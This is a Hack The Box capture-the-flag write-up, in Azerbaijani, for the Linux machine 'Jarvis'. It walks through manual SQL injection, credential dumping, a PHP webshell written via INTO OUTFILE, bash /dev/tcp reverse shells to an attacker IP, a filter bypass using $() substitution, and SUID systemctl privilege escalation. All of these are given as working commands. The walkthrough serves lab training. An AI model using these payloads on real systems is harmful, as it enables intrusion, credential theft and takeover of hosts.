# Jarvis (HTB)

> Platforma: Hack The Box  
> OS: Linux  
> Çətinlik: Orta  
> Nəticə: root

---

## Hücum Zənciri

```text
Kəşfiyyat
├── nmap -sC -sV -p- jarvis.htb → 22 (SSH), 80 (Apache "Stark Hotel"), 64999 (Apache + fail2ban)
├── gobuster → /phpmyadmin/, /images/, /js/, /css/, /fonts/
└── /rooms-suites.php → links /room.php?cod=N

SQL Injection (manual, no sqlmap)
├── Boolean-based: cod=1 AND 1=1 (6204 b) vs cod=1 AND 1=2 (5916 b)
├── ORDER BY 1..7 → works, ORDER BY 8 → error → 7 columns
├── UNION SELECT: cod=-1 UNION SELECT 1,version(),3,4,5,6,7 → MariaDB 10.1.48
├── DB dump: information_schema.schemata → hotel, mysql, information_schema
├── Dump mysql.user: DBadmin:<MYSQL_HASH>
├── File_priv=Y, secure_file_priv='' → file writes allowed
└── hashcat -m 300 → <PASSWORD>

İlkin Giriş (RCE via INTO OUTFILE)
├── LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf') → DocumentRoot: /var/www/html
├── INTO OUTFILE '/var/www/html/x.php' with hex of <?php system($_GET['x']); ?>
├── curl x.php?x=id → uid=33(www-data)
└── Reverse shell via bash + /dev/tcp → www-data

Üfüqi Yerdəyişmə (www-data → pepper)
├── sudo -l → (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
├── simpler.py: forbidden = ['&', ';', '-', '`', '||', '|']
├── Bypass via $() - command substitution is not blocked
├── /tmp/shell.sh: bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
├── sudo -u pepper simpler.py -p → Enter an IP: $(/tmp/shell.sh)
└── Shell as pepper → user.txt

Səlahiyyətlərin Artırılması (pepper → root)
├── find / -perm -4000 → /bin/systemctl (SUID root:pepper)
├── cat /home/pepper/root.service (Type=oneshot, ExecStart=bash reverse shell)
├── /bin/systemctl link /home/pepper/root.service
├── /bin/systemctl start root.service
└── Root shell → cat /root/root.txt
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

80 portunda "Stark Hotel" saytı olan Apache 2.4.25 (Debian) və 64999 portunda (fail2ban ilə) əlavə Apache. `room.php?cod=`-də SQL injection `INTO OUTFILE` vasitəsilə fayl yazmağa imkan verir, bu da webshell verir. Sonra - `pepper`-ə keçmək üçün `simpler.py`-də command injection və root üçün SUID `systemctl`.

---

## Kəşfiyyat

### Port Skanı

```bash
nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n jarvis.htb -oA scans/quick
nmap -sC -sV -Pn -n --open -p 22,80,64999 jarvis.htb -oA scans/detail
```

| Port  | Xidmət | Versiya                              |
|-------|--------|--------------------------------------|
| 22    | SSH    | OpenSSH 7.4p1 Debian 10+deb9u6       |
| 80    | HTTP   | Apache httpd 2.4.25 (Debian) - Stark Hotel |
| 64999 | HTTP   | Apache httpd 2.4.25 (Debian) - fail2ban |

64999 portu fail2ban ilə qorunur - tez-tez sorğular IP-ni 90 saniyə bloklayır. **Ona toxunmuruq** ki, girişi itirməyək.

### Qovluq Sadalaması

```bash
gobuster dir -u http://jarvis.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

| Yol            | Status |
|----------------|--------|
| /phpmyadmin    | 301    |
| /images        | 301    |
| /js            | 301    |
| /css           | 301    |
| /fonts         | 301    |
| /server-status | 403    |

---

## İlkin Giriş (SQL Injection)

### İnyeksiyanın təsdiqlənməsi

```bash
curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1" | wc -c
# 6204

curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=1" | wc -c
# 6204

curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=2" | wc -c
# 5916 - fərq → boolean-based SQLi
```

**Əsas məqam:** `-G` + `--data-urlencode` istifadə edirik ki, curl boşluqları (`%20`), `;` (`%3B`), `+` (`%2B`) düzgün kodlaşdırsın. Bu olmadan payload kəsilir.

### Sütunların sayının müəyyən edilməsi

```bash
for i in 1 5 7 8 9; do
  size=$(curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 ORDER BY $i" | wc -c)
  echo "ORDER BY $i → $size bytes"
done
```

- `ORDER BY 1..7` → 6204 bayt (uğur)
- `ORDER BY 8` → 5916 bayt (xəta)

**Nəticə: 7 sütun.**

### UNION SELECT

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('START',version(),'END'),3,4,5,6,7-- -" \
  | grep -oE "START.*END"
```

**Nəticə:** `START10.1.48-MariaDB-0+deb9u2END`.

### Verilənlər bazalarının dump edilməsi

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6,7 FROM information_schema.schemata-- -" \
  | grep -oE "hotel|information_schema|mysql|performance_schema" | sort -u
```

### MySQL giriş məlumatları

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT(User,':',Password),3,4,5,6,7 FROM mysql.user WHERE User='DBadmin'-- -" \
  | grep -oE "DBadmin:\*[A-F0-9]+"
```

**Nəticə:**

```
DBadmin:<MYSQL_HASH>
```

### MySQL heşinin sındırılması

```bash
echo '<MYSQL_HASH>' > hash.txt
hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt
```

**Nəticə:** `<PASSWORD>`.

### FILE imtiyazının yoxlanılması

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('F:',File_priv,':E'),3,4,5,6,7 FROM mysql.user WHERE User='DBadmin'-- -"
```

**Nəticə:** `F:Y:E` - FILE imtiyazı var.

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('SEC:',@@secure_file_priv,':END'),3,4,5,6,7-- -"
```

**Nəticə:** `SEC::END` - `secure_file_priv` boşdur, hər yerə yazmaq olar.

---

## İstismar (INTO OUTFILE vasitəsilə RCE)

### Web kökünün müəyyən edilməsi

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7-- -"
```

Cavabda: `DocumentRoot /var/www/html`.

### Fayl yazısının yoxlanılması

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 0x3c3f706870206563686f202848656c6c6f576f726c64293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/test.php'-- -"

curl "http://jarvis.htb/test.php"
# HelloWorld    2    3    4    5    6    7
```

`INTO OUTFILE` **mövcud faylı üzərinə yazmır**. Yeni fayl lazımdırsa - başqa ad istifadə edin.

### Webshell

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2778275d293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/x.php'-- -"
```

Hex `3c3f7068702073797374656d28245f4745545b2778275d293b203f3e` = `<?php system($_GET['x']); ?>`.

Yoxlama:

```bash
curl "http://jarvis.htb/x.php?x=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse shell

```bash
# Kali
echo -n 'bash -i >& /dev/tcp/10.10.14.177/4444 0>&1' | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzcvNDQ0NCAwPiYx

# Dinləyici
nc -lvnp 4444

# Webshell vasitəsilə göndərmə (GET parametri, boşluqlar üçün +, + üçün %2B)
curl -s "http://jarvis.htb/x.php?x=echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNzcvNDQ0NCAwPiYx+%7C+base64+-d+%7C+bash"
```

**Vacib:** URL-də `+` `%2B` kimi kodlaşdırılmalıdır, əks halda server onu boşluq kimi qəbul edir və base64 pozulur.

### Sabitləşdirmə

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Üfüqi Yerdəyişmə (www-data → pepper)

### Enumeration

```bash
sudo -l
```

```
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

### simpler.py-nin təhlili

```bash
cat /var/www/Admin-Utilities/simpler.py
```

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

**Əsas məqam:** filtr `&`, `;`, `-`, `` ` ``, `||`, `|`-i qadağan edir, lakin **`$`, `(`, `)`-i qadağan etmir**. Deməli, `$()` - command substitution istifadə etmək olar.

**Vacib nüans:** `os.system` `/bin/sh -c "..."`-i çağırır - Debian-da bu **dash**-dır, bash deyil. Dash **`>&`-i başa düşmür** - `Bad fd number` verir. Buna görə skript faylının içində `bash -c "..."` sarğısı lazımdır (**ikiqat** dırnaqlarla ki, dash məzmunu bash-a öz interpretasiyası olmadan ötürsün).

### Skriptin hazırlanması

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"' > /tmp/shell.sh
chmod +x /tmp/shell.sh
cat /tmp/shell.sh
# bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
```

### Dinləyici

```bash
nc -lvnp 4445
```

### Exploit

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# Enter an IP: $(/tmp/shell.sh)
```

**`pepper`-dən shell.**

### Sabitləşdirmə

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### İstifadəçi Bayrağı

```bash
cat /home/pepper/user.txt
# <USER_FLAG>
```

---

## Səlahiyyətlərin Artırılması (pepper → root)

### Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null | grep systemctl
ls -la /bin/systemctl
```

**Nəticə:**

```
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
```

SUID qoyulub, sahibi `root`, qrupu `pepper` - deməli `pepper` `systemctl`-i **root hüquqları ilə** işə sala bilər.

### Zərərli unit-in yaradılması

```bash
cat > /home/pepper/root.service << 'EOF'
[Unit]
Description=Root Shell

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.177/4445 0>&1'

[Install]
WantedBy=multi-user.target
EOF
```

### Dinləyici (ikinci terminal)

```bash
nc -lvnp 4445
```

### Exploit

```bash
/bin/systemctl link /home/pepper/root.service
# Created symlink /etc/systemd/system/root.service -> /home/pepper/root.service.

/bin/systemctl start root.service
```

`systemctl link` - qanuni əmrdir ki, unit faylını yalnız `/etc/systemd/system/`-dən deyil, hər yerdən qoşmağa imkan verir. SUID `systemctl` vasitəsilə öz unit-imizi qoşur və onu root kimi işə salırıq.

### Root shell

```bash
root@jarvis:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Bayrağı

```bash
cd /root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Bayraqlar

| Bayraq | Dəyər                            |
|--------|----------------------------------|
| User   | <USER_FLAG> |
| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **sqlmap olmadan manual SQLi** - boolean-based, ORDER BY, UNION SELECT. OSCP imtahanında sqlmap qadağandır, hər şey əl ilə edilir.
- **`INTO OUTFILE` faylı üzərinə yazmır** - eyni adla təkrar yazma zamanı MariaDB xəta qaytarır. Yeni ad istifadə edin.
- **Python-da `os.system` `sh` (dash) çağırır, bash deyil** - `>&` işləmir; ikiqat dırnaqlarla `bash -c "..."` sarğısı lazımdır.
- **Filtrlər tez-tez natamamdır** - `forbidden = ['&', ';', '-', '`', '||', '|']` `$()`-i buraxır, bu da command injection açır.
- **SUID `systemctl`** - GTFOBins klassikası. `link` unit-i hər yerdən qoşmağa imkan verir, `start` onu root kimi işə salır.
